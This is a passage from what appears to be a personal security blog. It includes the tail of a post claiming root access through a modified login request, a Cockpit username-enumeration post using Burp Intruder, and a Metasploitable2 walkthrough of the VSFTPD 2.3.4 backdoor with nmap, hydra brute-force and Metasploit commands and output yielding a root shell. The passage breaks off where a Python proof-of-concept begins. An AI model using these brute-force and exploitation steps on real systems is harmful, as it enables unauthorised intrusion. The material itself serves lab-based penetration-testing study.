<li>Accessing the Login Interface: I opened &#x2F;login_handler.cgi in Burp Suite’s browser and used the Forward button. For login, I entered the following credentials:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username : admin</span><br><span class="line">password : 1111111111</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>   <img src="/images/HANDLINK2.jpg"></p>
<ol start="3">
<li>Intercepting and Modifying the Request: Burp Suite captured the request, which appeared as shown below:</li>
</ol>
<p>   <img src="/images/HANDLINK3.jpg"> </p>
<ol start="4">
<li>Executing the Exploit: After modifying the intercepted package and sending the request, I gained root-level access to the server.</li>
</ol>
<p>   <img src="/images/HANDLINK4.jpg"> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/10/vuln-cockpit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/10/vuln-cockpit/" class="post-title-link" itemprop="url">The Cockpit system has an arbitrary user enumeration vulnerability</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-10 22:37:33" itemprop="dateCreated datePublished" datetime="2024-11-10T22:37:33-05:00">2024-11-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-11 09:14:50" itemprop="dateModified" datetime="2024-11-11T09:14:50-05:00">2024-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/Cockpit/" itemprop="url" rel="index"><span itemprop="name">Cockpit</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Using Burp Suite’s browser, open the URL: <a target="_blank" rel="noopener" href="https://192.168.1.10/auth/forgotpassword">https://192.168.1.10/auth/forgotpassword</a>. Burp Suite will capture the request packet. Click the “Forward” button, and the screen should look like this:</p>
<p><img src="/images/vuln1.jpg"> </p>
<p>Next, enter a username, such as admin, and click the “RESET” button. Burp Suite will capture another packet, which can be sent to the Repeater. It should appear as follows:</p>
<p><img src="/images/vuln5.jpg"> </p>
<p>Click the “Send” button in Burp Suite’s Repeater, and you’ll see the response:</p>
<p><img src="/images/vuln8.jpg"> </p>
<p>The response shows the following error message: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>:<span class="string">&quot;Invalid address: (from) root@localhost&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This indicates that the username admin exists. However, if you input a username that doesn’t exist, you’ll see the following response:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;error&quot;</span>:<span class="string">&quot;User does not exist&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In Burp Suite’s Repeater, the response appears as follows:</p>
<p><img src="/images/vuln9.jpg"> </p>
<p>From this, we can deduce that the user admin exists, while admin11111 does not. Using Burp Suite’s Intruder, we can attempt to enumerate other usernames. </p>
<p><img src="/images/vuln10.jpg"> </p>
<p>The results show that the following usernames exist:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">chen</span><br><span class="line">max</span><br><span class="line">user</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/05/VSFTPD2-3-4pentest/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/05/VSFTPD2-3-4pentest/" class="post-title-link" itemprop="url">VSFTPD 2.3.4 exploit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-05 21:42:06" itemprop="dateCreated datePublished" datetime="2021-03-05T21:42:06-05:00">2021-03-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-05 17:20:45" itemprop="dateModified" datetime="2024-01-05T17:20:45-05:00">2024-01-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Penetration-Test/metasploitable2/" itemprop="url" rel="index"><span itemprop="name">metasploitable2</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Penetration-Test/metasploitable2/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit/" itemprop="url" rel="index"><span itemprop="name">VSFTPD 2.3.4 exploit</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC"><a href="#metasploitable-linux-VSFTPD-2-3-4-exploit-with-hydra-metasploit-python-POC" class="headerlink" title="[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC"></a>[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC</h1><ol>
<li>Network Scan</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# nmap -A -sV 192.168.244.136</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 15:58 EST</span><br><span class="line">Nmap scan report for 192.168.244.136 (192.168.244.136)</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 977 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.244.140</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>VSFTPD 2.3.4 exploit with hydra</li>
</ol>
<p>First , we need construct dictionaries about username and password<br>here’s the dictionaries which usernames named usernames.txt and passwords named passwords.txt</p>
<p>then , we use the tools hydra with the follow command line:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /home/kali/Desktop/cd/mywordlists/usernames.txt -P /home/kali/Desktop/cd/mywordlists/passwords.txt 192.168.244.136 ftp -V</span><br></pre></td></tr></table></figure>
<p>here’s the command line ouput looks like:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 16:20:39</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.244.136:21/</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;admin&quot; - 1 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;msfadmin&quot; - 2 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;root&quot; - 3 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;user&quot; - 4 of 25 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;&quot; - 5 of 25 [child 4] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;admin&quot; - 6 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;msfadmin&quot; - 7 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;root&quot; - 8 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;user&quot; - 9 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;&quot; - 10 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;admin&quot; - 11 of 25 [child 10] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;msfadmin&quot; - 12 of 25 [child 11] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;root&quot; - 13 of 25 [child 12] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;user&quot; - 14 of 25 [child 13] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;&quot; - 15 of 25 [child 14] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;admin&quot; - 16 of 25 [child 15] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: msfadmin   password: msfadmin</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;msfadmin&quot; - 17 of 25 [child 6] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;root&quot; - 18 of 25 [child 5] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;user&quot; - 19 of 25 [child 7] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;&quot; - 20 of 25 [child 8] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;admin&quot; - 21 of 25 [child 9] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;msfadmin&quot; - 22 of 25 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;root&quot; - 23 of 25 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;user&quot; - 24 of 25 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;&quot; - 25 of 25 [child 4] (0/0)</span><br><span class="line">[21][ftp] host: 192.168.244.136   login: user   password: user</span><br><span class="line"></span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-05 21:20:47</span><br></pre></td></tr></table></figure>
<p>here, we found two users we could use to login the ftp server:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.244.136</span><br><span class="line">Connected to 192.168.244.136.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (192.168.244.136:kali): msfadmin</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54670|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 1000     1000            0 Oct 21 21:49 gordon.txt</span><br><span class="line">-rw-r--r--    1 1000     1000           29 Oct 30 23:31 myfile.log</span><br><span class="line">-rw-r--r--    1 1000     1000          914 Oct 21 14:59 nmap-list.txt</span><br><span class="line">drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; cd /</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; pwd</span><br><span class="line">Remote directory: /</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||54956|).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 bin</span><br><span class="line">drwxr-xr-x    4 0        0            1024 May 14  2012 boot</span><br><span class="line">lrwxrwxrwx    1 0        0              11 Apr 28  2010 cdrom -&gt; media/cdrom</span><br><span class="line">drwxr-xr-x   13 0        0           13860 Jan 05 20:57 dev</span><br><span class="line">drwxr-xr-x   94 0        0            4096 Jan 05 21:21 etc</span><br><span class="line">drwxr-xr-x    6 0        0            4096 Apr 16  2010 home</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 initrd</span><br><span class="line">lrwxrwxrwx    1 0        0              32 Apr 28  2010 initrd.img -&gt; boot/initrd.img-2.6.24-16-server</span><br><span class="line">drwxr-xr-x   13 0        0            4096 May 14  2012 lib</span><br><span class="line">drwx------    2 0        0           16384 Mar 16  2010 lost+found</span><br><span class="line">drwxr-xr-x    4 0        0            4096 Mar 16  2010 media</span><br><span class="line">drwxr-xr-x    3 0        0            4096 Apr 28  2010 mnt</span><br><span class="line">-rw-------    1 0        0           57012 Jan 05 20:54 nohup.out</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 opt</span><br><span class="line">dr-xr-xr-x  118 0        0               0 Jan 05 20:54 proc</span><br><span class="line">drwxr-xr-x   13 0        0            4096 Jan 05 20:54 root</span><br><span class="line">drwxr-xr-x    2 0        0            4096 May 14  2012 sbin</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Mar 16  2010 srv</span><br><span class="line">drwxr-xr-x   12 0        0               0 Jan 05 20:54 sys</span><br><span class="line">drwxrwxrwt    5 0        0            4096 Jan 05 20:59 tmp</span><br><span class="line">drwxr-xr-x   12 0        0            4096 Apr 28  2010 usr</span><br><span class="line">drwxr-xr-x   14 0        0            4096 Mar 17  2010 var</span><br><span class="line">lrwxrwxrwx    1 0        0              29 Apr 28  2010 vmlinuz -&gt; boot/vmlinuz-2.6.24-16-server</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>VSFTPD 2.3.4 exploit with metasploit:</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search vsftpd</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                  Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                  ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service</span><br><span class="line">   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 1</span><br><span class="line">[*] No payload configured, defaulting to cmd/unix/interact</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show info</span><br><span class="line"></span><br><span class="line">       Name: VSFTPD v2.3.4 Backdoor Command Execution</span><br><span class="line">     Module: exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2011-07-03</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  hdm &lt;x@hdm.io&gt;</span><br><span class="line">  MC &lt;mc@metasploit.com&gt;</span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">      Id  Name</span><br><span class="line">      --  ----</span><br><span class="line">  =&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">Check supported:</span><br><span class="line">  No</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name    Current Setting  Required  Description</span><br><span class="line">  ----    ---------------  --------  -----------</span><br><span class="line">  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">  RPORT   21               yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  Space: 2000</span><br><span class="line">  Avoid: 0 characters</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This module exploits a malicious backdoor that was added to the       VSFTPD download</span><br><span class="line">  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between</span><br><span class="line">  June 30th 2011 and July 1st 2011 according to the most recent information</span><br><span class="line">  available. This backdoor was removed on July 3rd 2011.</span><br><span class="line"></span><br><span class="line">References:</span><br><span class="line">  OSVDB (73573)</span><br><span class="line">  http://pastebin.com/AetT9sS5</span><br><span class="line">  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.244.136</span><br><span class="line">rhosts =&gt; 192.168.244.136</span><br><span class="line">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.244.136:21 - Banner: 220 (vsFTPd 2.3.4)</span><br><span class="line">[*] 192.168.244.136:21 - USER: 331 Please specify the password.</span><br><span class="line">[+] 192.168.244.136:21 - Backdoor service has been spawned, handling...</span><br><span class="line">[+] 192.168.244.136:21 - UID: uid=0(root) gid=0(root)</span><br><span class="line">[*] Found shell.</span><br><span class="line">id</span><br><span class="line">[*] Command shell session 1 opened (192.168.244.140:41279 -&gt; 192.168.244.136:6200) at 2024-01-05 16:46:43 -0500</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue </span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0</span><br><span class="line">    inet6 fe80::20c:29ff:fed5:c8b/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000</span><br><span class="line">    link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>VSFTPD 2.3.4 exploit with python POC:</li>
</ol>
<p>First, we should search the valid POC from kali’s exploit db with follow command line:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/cd]</span><br><span class="line">└─# searchsploit -t vsftpd      </span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                   |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------------</span><br><span class="line">vsftpd 2.0.5 - &#x27;CWD&#x27; (Authenticated) Remote Memory Consumption                   | linux/dos/5814.pl</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (1)                   | windows/dos/31818.sh</span><br><span class="line">vsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (2)                   | windows/dos/31819.pl</span><br><span class="line">vsftpd 2.3.2 - Denial of                                                         | linux/dos/16270.c</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution                                        | unix/remote/49757.py</span><br><span class="line">vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                           | unix/remote/17491.rb</span><br><span class="line">vsftpd 3.0.3 - Remote Denial of Service                                          | multiple/remote/49719.py</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Next, we copy the valid POC to current work directory, and try to exploit , the follow shows the exploit process: </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 